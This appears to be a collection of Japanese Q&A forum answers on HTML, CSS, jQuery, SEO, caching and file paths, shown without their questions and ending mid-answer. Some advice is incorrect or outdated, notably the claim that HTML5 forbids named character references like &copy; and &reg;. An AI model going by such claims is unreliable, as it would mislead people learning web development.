content:url(画像URL); } とかね。・・・
もうすこし具体的にソースだしてもらえない? 若干意味不明…
＞他のソースが共通のシンプルなhtmlが複数書かれた1枚の書類 　矛盾していますよ。 　エクセルからということは、おかしなタグがたくさんあるとかじゃないですか？？ 　エクセルの出力するHTMLは、エクセルを持っていないユーザーがブラウザで見るためのもので、ウェブで使われているHTMLとはほど遠いものです。 　もし、ウェブで公開するのでしたら、エクセルから、いったんCSVなどのテキストで書き出して変換するなり、プログラムを書いて動的にHTMLに変更する。あるいは、データベースに変換してPHPなどで出力する。XMLを作成して、XSLTを使ってHTMLに変換する。などになります。 XML <?xml version="1.0" encoding="UTF-8"?> <文書 id="A1"> <題名>Title Here</題名> <著者> <FIRSTNAME>Firstname</FIRSTNAME> <LASTNAME>Lastname</LASTNAME> </著者> <章> <段落>First line.</段落> <段落>Second line.</段落> </章> <章> <段落>First line.</段落> <段落>Second line.</段落> </章> </文書> <文書 id="A2"> <題名>Title Here</題名> <著者> ・・・・ ＞id番号だけ違って、他のソースが共通のシンプルなhtmlが複数書かれた1枚の書類 の具体的な例、サンプルをお示しください。 ・目的 ・スキル 　　Perlなどが扱える。高機能なテキストエディタがある。ウェブサーバーがある。 　　PHPが扱える。XMLとして出力できる・・・・など など
こんにちは。 <script> window.alert($.fn.jquery); </script> ↑すでにjqueryは読み込まれていると思うので、これのみをbody内に書いて、ブラウザで確認すればいいだけだと思います。 ただ、これは自分でHTMLを持っていて書き込み出来る場合のみしか使えません。 あと、HTMLのhead内に何かしら書いてないですか？ 例えば <script type="text/javascript" src="jquery-1.11.0.min.js"></script> とか <script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script> とか。 ＞jquery.flexslider-min.js?ver=2.2.2 ＞jplayer.playlist.min.js?ver=2.3.0 ＞バージョンがバラバラなのですが。。。 これはjQuery本体のバージョンじゃなくて、そのプラグインなどのバージョンなので、無視してよいです。 だいたい、jQuery本体をダウンロードして使っている場合、ファイル名はそのままだったりするので、ファイル名を見ればバージョンはわかるのですが、 たまにjQuery本体のファイル名を変更していることもあるので、その場合は、ファイル名から本体かな？とあたりをつけて、中身を見れば先頭に/*! jQuery v●.●.● jquery.comみたいにバージョンが書いてあると思います。
すみません。きちんと情報を出していませんでした。 エディタはヘテムルクリエーターを使いました。 href="http://page24.auctions.yahoo.co.jp/jp/auction/q8 …【至高の逸品】本場黄八丈無形文化財 山下八百子作 市松綾織137 の最期に「"」がないのです。 href="http://page9.auctions.yahoo.co.jp/jp/auction/k20 …●特選逸品●【極上】本場黄八丈 市松　綾織 紬 訪問着 149 も同様に。 私の方では4行目と10行目の「</tr>」の「</tr」部分が緑色になっています。
ANo1です。 ＞あなたは3位です。 ＞というようにHTMLで表示したいのですが どのような方法で表示なさっているのかわかりませんが、シートをそのままＨＴＭＬ表示機能か何かを利用して表示しているのではないかと想像します。 表示内容を後から加工するのは＜案2＞のような方法であれば可能ですが、＜案1＞はあくまでもそのまま表示するだけの案です。 ですので、後から加工することを考えずに、どうせ「表示用シート」を作るのであれば、そちらでデータの表示を「3」→「あなたは3位です。」となるように加工しておけば良いのではないでしょうか？ Googleのスプレッドシートは知りませんが、ＭＳエクセル的に考えれば、式や表示書式を設定しておくことで、上記のような加工は可能だと思います。
サーバーが POST を受けた後、以下を返してください HTTP/1.1 303 See Other Location: ttp://192.xx.xx.xx/送信しましたの様なページ.html 参考 https://www.google.com/search?q=http+code+303
いちいち要素内に記述するのはあまり感心しません。 <form action="" method="post"> ・・・・ <input id="name" name="name"・・> 　　☆nameとid属性は合わせたほうが良い。 なら、 form input#name{ 　font-size:2em; 　width:40em; 　padding:0.2em 0.5em; } とかペッと書いたほうが編集が楽
＞CSSに関しては知識はほぼないです。 　なら、それを先に学ぶほうがずっと早いし効率的です。数学や理科だってそうでしょ。公式に当てはめただけで解ける問題なんてそうざらにはない。きちんと基礎から身につければ、あれほど簡単なものないのに。 　高速道路をすっ飛ばしたいけど、車の運転を知らない・・と言われてもね。 　カスケーディングの理由で、うまく適用できていない。 tumblr カスタムcssを追加 - Google 検索( https://www.google.co.jp/search?q=Tumblr&ie=utf- … )
こんにちは、 私も、あまり詳しくありませんが？ まず、どんなホームページですか？ まづ。<title>abc.com</title>本当にこれがタイトルですか？ タイトルは、例えば、他の人が検索エンジンで検索する文章を入れる。 「○○市レストラン○○」こんな感じでタイトルを付けますよ！ もう一度ＨＴＭＬを確認して見てはいかがでしょうか？ 必ず原因が解ると思います。 私も、高齢者ですが、いろんな問題が有りましたが解決すると、またスキルアップした感じですよ！頑張って下さい。 あまり、質問に回答不足ですいますんでした。
＞ただ、HTMLでアンケートの作り方はわかったのですが、回答をアンケートで ＞使ったタブレットの中に蓄積させていきたいのです ネット上でなく、タブレット内に何らかのデータベースを作成する。 HTMLで、登録ボタン（仮称）を配置して、アンケートの内容をデータベースへ転送する。 こういった部分ですよね。 １、アンケートのHTMLはどうやって作成されたのでしょうか。 　　ホームページ作成のソフトがあれば、データベースへの接続の機能はありませんでしょうか。 ２、自分でプログラムを作成する。SQLサーバー（無償版）をインストールして 　　プログラム（VBなど）を勉強して、登録の機能を作る。 ３、お付き合いのあるベンダー会社に相談して作成してもらう。 　　さほど難しくもなさそうなので、さほど高額にはならないと思いますし、無難な選択かと。 ＞エクセルで作ろうと思えば作ることができるのですが、 タブレットがWindowsタブレットでエクセルがインストールされているのであれば エクセルのツールバーやリボンを非表示にして、VBAで作成しても良いような気もしますが。
私は大筋において ORUKA1951 と同意見ですが、ただ一か所ミスをしている点がございますのでここに記します。 ＞ itemprop　そのような属性はない!! 自分も検索してみて初めて知ったのですが、これは HTML5 に対する拡張の一つ microdata で定義されている属性です。 https://en.wikipedia.org/wiki/Microdata_(HTML) http://www.w3.org/TR/microdata/ https://html.spec.whatwg.org/multipage/microdata …
ですから ②いかに多くのユーザーをＨＰにおびき寄せられるか 　は間違いだと言ってます。 おびき寄せたら、目的と違ったらすぐ検索エンジンに戻って次のページを閲覧する。 結果的に分母が大きくなって、どんどんと順位が下がる・・ 大事なことは 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから ・検索エンジンではなく、ユーザーの利便性を最優先に考慮してページを作成する。 ・ユーザーをだますようなことをしない。★これはしてはならない★ ・検索エンジンでの掲載位置を上げるための不正行為をしない。ランクを競っているサイトや Google 社員に対して自分が行った対策を説明するときに、やましい点がないかどうかが判断の目安です。その他にも、ユーザーにとって役立つかどうか、検索エンジンがなくても同じことをするかどうか、などのポイントを確認してみてください。 ・どうすれば自分のウェブサイトが独自性や、価値、魅力のあるサイトといえるようになるかを考えてみる。同分野の他のサイトとの差別化を図ります。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［ウェブマスター向けガイドライン（品質に関するガイドライン） - Search Console ヘルプ( https://support.google.com/webmasters/answer/357 … )］より
難しい事しないで、2点チェック ①画像名は 半角英数.拡張子 　拡張子は画像をダブルクリックして開くと.gifとか.jpgとか.pngと成ってるからその通りに記入 ②その画像をhtmlが格納されているフォルダに入れる。 場所が違うと、相対フォルダ指定しないとイケナイので面倒。 後で勉強するとして当面は同じフォルダに置く。 <img src ="gazou.jpg" /> の様になる筈
日本語のサイトでしたら html,body{margin:0;padding:0;} h1,h2,h3,h4,h5,h6,p{margin:0;line-height:1.6em;} p{text-indent:1em;} としておく程度でよいでしょう。 全ての、タイプセレクタのmarginやpaddingを消すのは、あまり感心しません。登場する都度、再設定する羽目になりスタイルシートが複雑になりすぎます。 　ウェブ開発でしたら開発ツールの豊富なfirefoxをお使いだと思いますが、そのアドオンにfirebugがあります。それで調べるとどの要素のマージン/パディングが効いているかがすぐわかります。 黄色がmargin
たとえば。。。 道路交通法,(略)道交法( http://www.houko.com/00/01/S35/105.HTM ) へ行って目次で 第３章　車両及び路面電車の交通方法 を選択して、が移動場所に移動したら、そのタイトルを選択して右クリックで、Firefoxのアドオン(MakeLink)が表示されるので、文字列(URL)を選択すると・・ 第３章　車両及び路面電車の交通方法( http://www.houko.com/00/01/S35/105.HTM#s3 ) がクリップボードに保存されるので、ペーストするだけ。 MakeLinkは、これは、コンテキストメニューを、文字列(URL) : %text%( %url% ) と設定しているから ほかにも、さまざまに設定できて、 HTMLソースとして <a href="http://www.houko.com/00/01/S35/105.HTM#s3">第３章　車両及び路面電車の交通方法</a> とか、 このような場所で利用する 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 第３章　車両及び路面電車の交通方法 第１節　通　則 （通則） 第16条　道路における車両及び路面電車の交通方法については、この章の定めるところによる。 ２　この章の規定の適用については、自動車又は原動機付自転車により他の車両を牽引する場合における当該牽引される車両は、その牽引する自動車又は原動機付自転車の一部とする。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［道路交通法,(略)道交法( http://www.houko.com/00/01/S35/105.HTM#s3 )］より とかHTMLソース blockquote cite="http://www.houko.com/00/01/S35/105.HTM#s3"> <p> 第３章　車両及び路面電車の交通方法 第１節　通　則 （通則） 第16条　道路における車両及び路面電車の交通方法については、この章の定めるところによる。 ２　この章の規定の適用については、自動車又は原動機付自転車により他の車両を牽引する場合における当該牽引される車両は、その牽引する自動車又は原動機付自転車の一部とする。 </p> <address><a href="http://www.houko.com/00/01/S35/105.HTM#s3">道路交通法,(略)道交法</a></address> </blockquote> とか・・がワンクリックでできる。 makeLink 使い方 - Google 検索( https://www.google.co.jp/search?q=makeLink%20%E4 … ) と検索すると使い方はたくさん出てくる。 ここで回答するときに、makeLink 使い方といったん書いて、その部分を選択してfirefxのContext Search( https://addons.mozilla.org/ja/firefox/addon/cont … )で、直接googelに進み、そのページでMakeLinkを使えば一瞬で、書き込める。 　firefoxはこのようなアドオンがものすごく豊富で便利ですから・・ Add-ons for Firefox( https://addons.mozilla.org/ja/firefox/ ) ＞今後、リンクを張るときに「第Ｌ章」とか「第Ｍ行目」とか「第Ｎ段落」まで指定したかったらどうしたら良いのでしょうか。 　上記アドオンだと、一秒もかからない。一瞬でOK
No.1です。 今気が付いたが、 ＞文字コードをLFで保存してほしいといわれました。 ではなくて ＞文字コードをUTF8で保存してほしい じゃないですよね。 　改めて読み返すと、CR,LF,CR+LFは文字コードとは言わない。
酷い回答が多いのでご注意を! 今から作成されるなら、HTML5だと思いますが、今はHTML4.01で、のちにHTML5が主流になるのは明らかなので・・ 基本的なことでありながら、HTML5では、基本的に文字実体参照と呼ばれていたものは、ごく一部を除いて使えません!!!・・・これはほとんど知られていない・・ 　HTML5にはDTDが存在しないために、使うことができない。 &lt;　&gt;　&amp;　&quot;　&apos; 　<　　>　 　&　　　　"　　　　,　　以外は半角でかまわない。半角で書くべき 以外は、すべて使えないと思ってください。それ以外は、そのまま記述してかまいません。 今後はUTF-8が標準というか、それで作成するのがデフォルトとなりますから、上記のHTMLのコードと間違われる可能性のある物--とはいっても<>だけですが・・・以外は全角だろうが半角だろうが、؀؂؂アラビア文字であろうが、갡갢ハングルだろうが、x²だろうが、相手がフォントを持ってさえいれば表示される。 　ただし、その部分が何語であるかは示す必要がある。アラビア文字は右から左へ書くのでね。 　私は基本的には日本語は全角--しかないのですが、欧文は半角です。だって、Hyper text Markup Language は英語ですから・・ HTMLとは、Hyper text Markup Language の略です。が正しい・・ ★よく使われている &copy;　© &reg;　　® は使えません。・・・・今後は
javascriptのソースを提示してください。 ただ、今はjavascriptでしなくCSSを使う方が多いし、そのほうがSEO的にも圧倒的に有利ですし簡単ですよ。
フッターの横幅が狭く、body内で左寄せになってるから。 左寄せフッター内でcenterに納まっているという事。 具体的な修正方法はurlを見ないと解らない。
HTML に以下を追加する <script> Array.prototype.slice.apply(document.getElementsByTagName('p')).forEach(function(p){p.onclick=foo}); </script>
必要ないものですよ。 単純に、Alt+← でどのブラウザでも元のページに順番に戻るのでね。(^^) 　　戻るボタンをクリックしてもよいし。 そうではなく、迷子にならないように、「パンくずリスト（breadcrumb list）」-- ヘンゼルとグレーテル( https://ja.wikipedia.org/wiki/%E3%83%98%E3%83%B3 … )の童話に由来する。 　を書いておきます。 　今後ページが増えていくことを想定すると、「元に戻る」ではなく、そのサイトの樹構造に合わせて、 TOP→書籍→ウェブ関連→HTML基礎 　のようなパンくずリストを置く方が良いです。この教えてgooでもそうしている。 このページの上を見てごらん 　 教えて！goo > [技術者向] コンピューター > プログラミング > HTML > 直前のページに戻りたい 　元のページには、[戻るボタン]や、[Alt + ←] で、いくらでも戻れるのですから、おせっかいになる。 　古い人は、ブラウザのショートカットキー知らない人が多いのでしょう。 Ctrl + L とか、Ctrl + B とか、Ctrl + H とか、Alt+Home・・・(^^)
では、section要素を伸縮させてみましょう。 /* 初期状態 */ section{ /* 要素セレクタ */ height:100px; overflow:hidden; background-color:white; } /* 変更するプロパティを指定する */ section{ height:100px; overflow:hidden; background-color:white; transition-property: background-color, height;/* transitionを適用されるプロパティ all でもよい */ transition-duration:1s;/* 時間 */ transition-timing-function:ease-in-out;/* 変化の仕方 */ } /* 次いで、変化させるタイミングを疑似クラスで指定する。 */ section{ height:400px; background-color:aqua; } /* ターゲットになっている要素 */ section:target{ /* リンクのターゲット:target疑似クラス */ height:400px; background-color:aqua; } /* あるいは */ section:hover{ /* マウスを載せたとき:hover疑似クラス */ height:400px; background-color:aqua; } この程度の簡単なものから始めて、応用することを考える。 これは、section:targetの詳細度が 0,0,1,1 と、sectionの詳細度 0,0,0,1よりも大きいために上書きされるのです。 ですから、 section:hover{ height:400px; background-color:aqua; } section{ height:100px; overflow:hidden; background-color:white; transition-property: background-color, height; transition-duration:1s; transition-timing-function:ease-in-out; } と書かれていても、スタイルが変更される。 ★ たぶん、要素セレクタ、属性セレクタ、詳細度と言われてもチンプンカンプンだと思いますが、これらのカスケーディングという仕組みこそ、CSS(カスケーディング・スタイル・シート)の命なのです。 　それかあるから、 ＞HTMLが崩る 　なんてことなく、特定の要素のみスタイルが指定できるのですよ。 いちどCSS2.1の仕様書の前半部分を読んでおかれるとよい。CSS3、どころかCSS2.1に手を出す前にね。そしたら、CSSで可能なことは自在に操れるようになる。 1 CSS 2.1仕様について 2 CSS 2.1の手引き 3 適合性：必要条件と推奨事項 4 構文と基本データ型 5 セレクタ 6 プロパティー値とカスケーディング、継承の割り当て http://momdo.s35.xrea.com/web-html-test/spec/CSS … 特に4.5.6.は!!!
No.1です。書き方少々違っても表示してくれる。 それよりも、あなたが独自ドメイン持っていてそのサーバーのルートにfaviconを置いておけば、何も書かなくてもよいということ。
キャッシュ対策です。 httpでは GETコマンドに対してブラウザ側のキャッシュや プロクシ、サーバのキャッシュが効いてくるので コンテンツを入れ換えても5~6分の間古い情報が返ります。 古~いIEは極悪で、キャッシュを設定で永久保存可能だったりして、 昔は対策に悩みました(^-^; ページにキャッシュオフの指定を埋め込む手も有りますが トラフィックが増えてしまいます。 頻繁に変わるコンテンツやJSのデバック時は、 ダミ－のクエリパラメータを変化させて キャッシュを回避することがよく行なわれます。 このため現在時刻等を元にダミーのクエリパラメータを 生成して埋め込んでくれるライブラリが沢山 存在します。 これってけっこう大事で、出来るだけキャッシュオフせず かつGETで画面遷移を行いたい時 等は必要な技術です。 #POSTはキッシュされません。
h1～h6は、見出し(headding)を示すタグです。 ★決して文字を大きくするためのものではありません。 　screenと呼ばれるブラウザだと大きく表示しますが、スクリーンリーダーだと男声ですこし大きく読み上げる。検索エンジンにはもちろん「見出し」として提示します。 　HTML4.01では、単に見出しのレベルを示していましたから、その見出しの示す文書集合が明確ではありませんでした。そのためDIV要素を使って文書の階層/樹構造を示す必要がありました。 『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 (例) <body> 　<div class="header"></div> 　<div class="section"> 　　<h2></h2> 　　<div class="section"> 　　　<h3></h3> 　　　<div class="section"> 　　　　　<h4></h4> 　　　</div> 　　</div> 　　<div class="section"> 　　　<h3></h3> 　HTML5では、文書構造は新たに設けられた、header,section,footerなどで示すことになりました。特に文書のアウトラインはsectionで示しますから <body> 　<header></header> 　<section> 　　<h2></h2> 　　<section" 　　　<h3></h3> 　　　<section> 　　　　　<h4></h4> 　　　</section> 　　</section> 　　<section> 　　　<h3></h3> となります。 section要素の入れ子で階層を示す。 なお、section 要素は、必ず一つのheading要素をもつことが期待されています。 そのため <body> 　<header></header> 　<section> 　　<h1></h1> 　　<section" 　　　<h1></h1> 　　　<section> 　　　　　<h1></h1> 　　　</section> 　　</section> 　　<section> 　　　<h1></h1> と記述してもよいことになりました。 4.3 Sections — HTML5( https://www.w3.org/TR/2014/REC-html5-20141028/se … ) 　ただし、 ・その文書全体の流れに属しない場合は、article要素を使用します。 　article要素は、その内部にheader,section,footerを持つと期待される独立した記事 　<section> 　　<h3></h3> 　　<article> 　　　<header><h1></h1></header> 　　　<section></section> 　　</article> とか・・ ・本文と関係ないブロックは<aside>要素を使います。 　HTML4.01 なら、<div class="aside">補足記事</div>と書いてました。 ＞h4→h2という流れが存在します。 　全く問題ありません。DOMツリーを書くとわかるが |--1節<h1> |　　|-- 1章<h2> |　　|-- 2章<h2> |　　 　　|-- 1項<h3> |　　 　　|-- 2項<h3> |--2節<h1> しかし、 <h1>→<h3>はあり得ない。 ＞特に下のＵＲＬのバズ部はSEOに非常に詳しい会社のＨＰですが、 　それはないですね。 Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html ) 　でチェックすると酷い物です。とてもそのようには見えない。 googleがh3以降を無視するというのは誤解で、たとえ <section> 　　<h3></h3> 　　<section> 　　　　<h2></h2> 　　　　<section> 　　　　　　<h1></h1> と書いていても、最初の<h3>や次の<h2>は見ます。 　googleは文書の内容を分析して階層を見ているということ
表示している画面上の値だけカウントアップされるのではなく、投票結果はサーバー上に保存されるのですよね？ でしたらHTMLだけでは無理です。画面上で入力された値をサーバへ飛ばし、サーバ上に配したプログラムがそれを受けてデータを処理してファイルなりデータベースなりに格納。格納出来たら最新の投票状況を示したHTMLを返す、、、という仕掛けを作らねば出来ません。つまり「サーバ上に配したプログラム」の作成が必要です。 なお、表示している画面上の値だけカウントアップされればよいのでしたらHTML＋Javascripで可能です。 参考まで。
No.1です。 えっと。。。 Javascriptというものがあることはご存知でしょうか？ ご存じない場合はまずどういうものかを勉強されないと、答えを知っても何をやっているのか、なぜそれでよいのかを理解できず、結局その場限りで終わってしまいます。 本屋さんへ行くと入門書もありますし、ネット上にも初歩から解説しているサイトがたくさんありますから、それらを使って基本的な事を取得されるとよいと思います。 また、それなりに使ったご経験がおありの場合は、応用が出来ないということだと思いますので、まずはJavascriptでHTMLのFORM内の変数を参照したりセットしたりする基本的なやりかたを復習し整理されるとよいと思います。 Javascriptの関数内でsubmitする方法なども同様です。 【補足】「Javascript フォーム　ラジオボタン　参照」とか 　　　　「Javascript フォーム　submit」とかの適当なキーワード 　　　　で探すと各種解説が簡単に見つかります。 基本をしっかりおさえれば、次回以降「こんなことをしたい」と思った時に調べる足掛かりがあるので自力で対応できるようになると思います。 趣味でやられているにしろ、お仕事でやられているにしろ、そういた部分が大変大切かと思います。 ちなみに「こういう入力を与えた際にこういう出力得たい」というテーマが有った際、最も重要なのは処理アルゴリズムを考えられるかどうかです。それをどういう言語で実装するかは言語の教科書を見ながらでもなんとかなります。 今回は「呼び出すcgiを分けたい」ということでブラウザ側で動作するJavascriptということにしましたが、「処理機能を分けたい」だけであれば、同様の判断をJavaやPHPやPerlやC言語といったサーバ側のプログラム言語を使って実装することも可能なわかですから。
#1はあり得ないですが・・(^^)例えとして #以降は無視されます。これは基本的にはブラウザの持つ機能で、サーバーへの要求ヘッダには含まれません。 URL 　これはネットワーク上のファイルを特定する手段で、ドメイン+パス情報+(?以降、#の前までの)QUERY_STRINGです。 　そもそもSEOを誤解されている節があります。SEO( Search Engine Optimization )とは、県産エンジン最適化という意味で、検索エンジンにそのページの内容が正確に伝わる手法・技術です。文書構造がわかるように、HTML4.01では、<h1>ここは文書の見出し</h1>、<p>ここは一つの段落</p>から始まり、それで足りないときは、<div class="header">ここはこの文書のヘッダ</div>、<div class="aside">これは主題に関係ない補足記事(検索エンジンは無視してね)</div>、<div class="navigation">ここはナビゲーション</div>のように、 ★DIV要素・・は、id属性及び class属性と併用することで、文書に構造を付加( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　してきましたね。あまり守られなかったので、HTML5では、 ★文書構造を明確化するために新しい要素が追加されました。 　http://standards.mitsue.co.jp/resources/w3c/TR/h … ★【問題2】文書内に埋め込まれた「意味」が不明確( http://www.atmarkit.co.jp/ait/articles/1008/30/n … ) 　ご存知だと思いますが、ここまでがSEOの基本です。それがあって初めて検索エンジンはあるキーワードで検索されたときに、どのページがそのキーワードに対して最も適切かを提示できるのです。いわゆるＳＥＯ対策とは、結果であって目的ではない。 ＞3項目それぞれのURLにSEO対策する事は可能ですか？ 　というよりは、ページ全体に検索エンジン最適化をすればよいだけです。なぜなら表示されるURLに#は決して含まれないのですから、 <body> 　<header>文書のヘッダ</header> 　<section> 　　<h2>この章の見出し</h2> 　　<section id="abc"><!-- idやclassに数字から始まるものは使えないので --> 　　　<h3>この項の見出し</h3> 　　</section> 　　<section id="efg"> 　　　<h3>この項の見出し</h3> 　　</section> 　　<section id="hij"> 　　　<h3>この項の見出し</h3> 　　</section> 　</section> <footer></foorter> HTML4.01でしたら <body> 　<div class="header">文書のヘッダ</div> 　<div class="section"> 　　<h2>この章の見出し</h2> 　　<div class="section id="abc"><!-- idに数字は使えないので --> 　　　<h3>この項の見出し</h3> 　　</div> 　　<div class="section" id="efg"><!-- idに数字は使えないので --> 　　　<h3>この項の見出し</h3> 　　</div> 　　<div class="section" id="hij"><!-- idに数字は使えないので --> 　　　<h3>この項の見出し</h3> 　　</div> 　</div> <div class="footer"></div> で、#への対策は完了です。 　要は、HTMLには文書構造以外一切書かない。それだけです。プレゼンテーションはスタイルシートに任せましょう。 「構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」
＞ホームページ閲覧用のindex.htmlファイルを作成しFFFTPソフトで 　正確に用語を使わないと意味不明になってしまう。 index.html があなたのサイトのホームページですよね。(ページは単数形でそのファイルを示す)。サイト全体はウェブサイト。 ホームページとはブラウザを起動したときに最初に表示されるホーム(起点)ページ。ホームベースとか、ゴーホームのホーム ホームページ - Wikipedia( https://ja.wikipedia.org/wiki/%E3%83%9B%E3%83%BC … ) 　で、質問は ＞index.html というHTMLファイルをサーバーに転送したが、HTTP経由では画像が表示されない ということだと思います。 ＞サーバーにアップしたファイル容量は元のサイズより縮小されてますが 　それは通じようはわずかです。FTP(File Transfer Protocol)で転送するのは、OSによって改行コードが異なるWindowsは\r\n、UNIXは\n、旧Macは\n)を変換する程度ですから、行数×数ビットしか小さくならないはずです。(HTMLはテキストファイルですからバイナリ―で送ってはなりません。必ずテキストモードで転送します。その際にほんの少しサイズが変わることはあります） ＞画像が表示されない 　これは画像がないということ。 　HTTPプロトコルでは、いったんそのファイルを受け取った後、ブラウザが改めてサーバーにそのページに必要なファイルを要求していくものです。 　そのページ(例えば、hoge.com/abc/index.html ) に<img src="img/1.jpg"・・> とあれば、 hoge.com 　/ 　|-- abc/ 　　　|-- index.html に、"img/1.jpg"　とある 　　　|-- img 　　　　　|-- 1.jpg　<-- ここにあるはず よってサーバー(hoge.com)に対して GET: /abc/img/1.jpg と要求します。 サーバーは、それを探して提供するけどそれがない。みつからない ★その画像が表示されるべき場所で右クリックして「画像だけを表示」で画像のあるべきところに飛ぶはずです。 　画像の位置は、<img src="" alt="代替テキスト">とaltは必須ですからわかるはず。 　　「alt属性は、IMG要素とAREA要素では必ず指定しなければならない。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 　それで、404 Not Found だったら画像がない。 　ウェブ開発なら開発ツール( https://addons.mozilla.org/ja/firefox/extensions … )が豊富なFirefoxをお使いだと思いますが、Firebug( https://addons.mozilla.org/ja/firefox/addon/fire … )つかうとソースの結果がすぐわかる。 　またサーバーとのやり取りは、Live HTTP Headers( https://addons.mozilla.org/ja/firefox/addon/live … )で確認できます。--GET: /abc/img/1.jpg に対して、どんな応答があるかなど・・ ＞専門知識が乏しいのでパスを良く理解してませんが 　理科や数学と一緒、別に専門知識というほど難しい物じゃない。基本からきちんと身につけたら、科学技術系のものですからとっても簡単。急がば回れと言いますが、この世界はきちんと基礎から順を追って学ぶと簡単な世界ですよ。
<center></center>・・・HTML4以降非推奨です。その後のHTMLにはありません。 　center( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) align="center"・・・・・・HTML4以降、代表的な非推奨属性 　align( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) そのままだと、 <html> <head> <title>TAG index Webサイト</title> </head> <body> <p style="text-align:center"><a href="#" onClick="window.close(); return false;">閉じる</a></p> </body> </html> とか 　変な道に迷い込まないように、まず HTML 4.01 Specification (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　だけは、ざっとでよいので目を通しておきましょう。 「センターに配置するにはどうしたら良いでしょうか？」 とつまみ食いしても、時間ばかりかかるうえに、とんでもないことを身につけてしまう。私はこの道25年経ちますが、その経験から断言できるのは、仕様書を通読してから取り掛かることです。 　現在--と言っても1999年(15年前)のHTML4.01の勧告以来の主流は、一言でいうと「構造とプレゼンテーションの分離」です。HTMLには文書構造しか書かない。どのように表現「プレゼンテーション」するかはもっぱらスタイルシートに任せる。 　なお、私はjavascriptは、ほとんど使用しません。大きな理由はjavascriptを無効にしているユーザーが多いこと、大抵はスタイルシートでカバーできること。特に閉じるなんてウィンドウの右上の×をクリックすればよいだけなので、おせっかいはしたくない。
案1 一括書き換えプログラムにて、HTML ファイルに埋め込んでから、サーバーに公開する 良: 利用側にとっては便利 悪: プログラムを用意しなければならない / 公開時の手順が増える 案2 HTML ファイルを PHP/JSP/ASP/etc 化して、HTTP 要求時に埋め込む 良: 最終的には単純な HTML なので、利用側にとっては便利 悪: HTML でなくしてしまうので、デザインと実装が分かれてしまう 案3 HTML ファイルにスクリプトを組み込み、HTTP 応答後に AJAX で埋め込む 良: 作成側の手間がほとんどかからない 悪: 閲覧時に余計な処理が入るので、利用側にとって少しだけ不便になる
意味が分からないのですが、表示範囲内で折り返されないということですね。 firebugで確認されるとわかると思いますが、white-spaceにpreなどが指定されている。あるいは<pre></pre>で噛んでしまっているなど・・
URLに使える文字とその意味は絶対に必要な基礎ですから、間違えないように http: は通信プロトコル（手続き）を指定します。 　ほかに、https:とかmail:とか、色々ある //はインネット そのあとに続くアルファベットと.はドメイン--というかサーバーのアドレスを指定する。 この部分だけは、大文字小文字の区別はない。WWW.RaKuten.NE.jpでもね。 / 最初はルート(根っこ)を示す。 以下は、パス情報、 　ファイル名の指定ではない。abc.htmlと書かれていてもファイルとは限らない ?以降はQueryStringというサーバーに与える情報 そのあと、情報のヘッダが続き、場合によったら標準入力で情報を渡す。 よって、他のサーバーにある情報をifrqmeで使わせないようにするには、:だけを監視すればよい。httpや/はチェックしてはならない。 　これはわかりますよね。/hyyp/ht./かもしれないので・・ ★他のサーバーにある情報をifrqmeで使わせないようにする 　なら同じサーバーなら、絶対パスで指定すればよい（回答1） すなわち href="/gold/〇〇〇〇/header.html" 　これで【呼び出し元のファイルがどこにあっても】ブラウザは GET:/gold/〇〇〇〇/header.html とサーバーに要求してくれる。 　自分でHTML書く時だって、 <img src="/images/photo/abc.jpg"・・・ <a href="/">TOP</a> <a href="/books/abc.htl"> とすれば、そのファイルをどこに持って行ってもHTML書き換えなくてよいでしょ。(^^)
不必要にdivは書かない!!!。 [HTML4.01]でしたら、骨格は <body> 　<div class="header"> ・・・ページのヘッダ・・・ 　</div> 　<div class="section"> ・・・【中略】・・・ 　　<table border="1" summary="なんたらの表"> 　　　<tbody> 　　　　<tr> ・・・【中略】・・・ 　　　　</tr> 　　　</tbody> 　 　</table> 　</div><!-- 本文終了 --> 　<div class="footer"> 　　<p>Copyright 2015 ***** All Right Reserved</p> 　　<address>*******</address> 　</div> </body> 参考に[HTML5]でしたら <body> 　<header> ・・・ページのヘッダ・・・ 　</header> 　<section> ・・・【中略】・・・ 　　<table> 　　　<tbody> 　　　　<tr> ・・・【中略】・・・ 　　　　</tr> 　　　</tbody> 　 　</table> 　</section> 　<footer> 　　<p>Copyright 2015 ***** All Right Reserved</p> 　　<address>*******</address> 　</footer> </body> 【重要なことをいくつか!!】 ・DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　決してデザインのためではありません。文書構造を補完するためです。HTML5では「文書構造を示す要素が足りなかったために」新しい要素が追加されました。-- http://standards.mitsue.co.jp/resources/w3c/TR/h … 　divのidやclass名は、HTML5の要素名とその目的を参考にするとよいでしょう。 ・他に適切な要素がある時はDIVは使ってはなりません。 NOTE: Authors are strongly encouraged to view the div element as an element of last resort, for when no other element is suitable.( https://www.w3.org/TR/html5/grouping-content.htm … ) 　「著者は他に適切な要素がないときの最後の手段として、div要素を使用することが強く奨励されます。」 　 　ちなみに、header,footer,navなどはidではなくclassであるべきです。なぜなら、一つの文書内に複数存在しうるものだからです。例えばheader,section,footerは、「完結した独立した記事」を示すarticle内に必ず登場すると期待されていますし、sectionはその階層で文書の樹構造が示されるのですから・・ ・tableは、文書を成型するために用いてはなりません。 ★以上を踏まえたうえで、 </table> </div> <div id="footer">Copyright 2015 ***** All Right Reserved</div> <div id="footer">*******</div> のままだとすると、 table+div{ /* table要素に続くdiv要素(隣接セレクタ) */ margin:10px;/* この値を変えてみる */ padding:10px;/* この値を変えてみる */ } table+div+div{ /* tableの隣のdivの隣のdiv */ margin:10px;/* この値を変えてみる 